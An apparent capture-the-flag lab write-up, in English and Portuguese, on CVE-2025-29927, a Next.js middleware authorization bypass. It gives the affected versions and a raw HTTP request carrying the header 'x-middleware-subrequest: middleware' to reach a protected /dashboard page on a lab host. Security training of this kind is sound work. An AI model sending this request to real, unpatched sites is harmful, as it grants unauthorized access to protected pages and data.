#+title: Middleware Bypass
#+author: gabriel

* intro
Next.js is an open-source web framework developed by Vercel that powers React-based applications with capabilities such as server-side and static rendering.

This laboratory contains a critical vulnerability in Next.js middleware functionality, identified as CVE-2025-29927. The flaw allows complete bypass of middleware-based authorization by including a specially crafted x-middleware-subrequest header in HTTP requests. This is especially dangerous for applications that depend on middleware for access control, path rewrites, server redirects, and security headers such as Content Security Policy (CSP).

The vulnerability affects Next.js versions 11.1.4 through 13.5.6, 14.x before 14.2.25, and 15.x before 15.2.3.

What is the secret on the /dashboard page accessible by bypassing access control?

* with curl and burp
Após enviar a request para um endpoint identificado porém que exige autenticação, use o header x-middleware-subrequest: middleware para o exploit
#+begin_src sh
GET /dashboard HTTP/1.1
Host: dynamic-lettuce.europe1.hackviser.space
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Content-Length: 0
x-middleware-subrequest: middleware
#+end_src

e então o bypass será executado
